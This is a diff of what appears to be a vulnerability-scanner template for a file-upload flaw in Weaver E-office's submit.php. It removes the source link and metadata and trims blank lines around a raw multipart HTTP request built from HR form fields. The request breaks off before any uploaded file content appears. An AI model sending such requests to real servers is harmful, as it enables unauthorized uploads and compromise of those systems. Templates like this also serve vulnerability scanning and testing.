@@ -3,12 +3,8 @@ info:
   name: 泛微 E-office submit.php 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/agxgkv1wttvvgm0x'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: agxgkv1wttvvgm0x
-    fofa: 暂无
 http:
 - raw:
   - 'GET /general/hrms/manage/submit.php HTTP/1.1
@@ -17,14 +13,10 @@ http:
     Content-Type: multipart/form-data; boundary=6863626f66d8f459eace16cc55e33b30
 
 
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="HR_ID"; filename=""
-
-
 
 
     1
@@ -36,18 +28,10 @@ http:
     Content-Disposition: form-data; name="ID"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="USER_ID"; filename=""
-
-
-
-
 
 
     --6863626f66d8f459eace16cc55e33b30
@@ -56,21 +40,13 @@ http:
     Content-Disposition: form-data; name="photo"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="ATTACHMENT_PIC_NAME"; filename=""
 
 
-
-
     C:\\fakepath\\4.jpg
-
-
 
 
     --6863626f66d8f459eace16cc55e33b30
@@ -79,18 +55,10 @@ http:
     Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="ATTACHMENT_NAME_OLD"; filename=""
-
-
-
-
 
 
     --6863626f66d8f459eace16cc55e33b30
@@ -105,26 +73,16 @@ http:
     Content-Disposition: form-data; name="DEPT_ID"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="check_hr_no"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="NO"; filename=""
-
-
 
 
     1
@@ -136,8 +94,6 @@ http:
     Content-Disposition: form-data; name="hr_name"; filename=""
 
 
-
-
     123
 
 
@@ -145,8 +101,6 @@ http:
 
 
     Content-Disposition: form-data; name="STATUS"; filename=""
-
-
 
 
     1
@@ -158,8 +112,6 @@ http:
     Content-Disposition: form-data; name="sex"; filename=""
 
 
-
-
     2
 
 
@@ -169,18 +121,10 @@ http:
     Content-Disposition: form-data; name="dept_id"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="BIRTHDAY"; filename=""
-
-
-
-
 
 
     --6863626f66d8f459eace16cc55e33b30
@@ -189,18 +133,10 @@ http:
     Content-Disposition: form-data; name="MARRY"; filename=""
 
 
-
-
-
-
     --6863626f66d8f459eace16cc55e33b30
 
 
     Content-Disposition: form-data; name="EDUCATION"; filename=""
-
-
-
-
 
 
     --6863626f6'
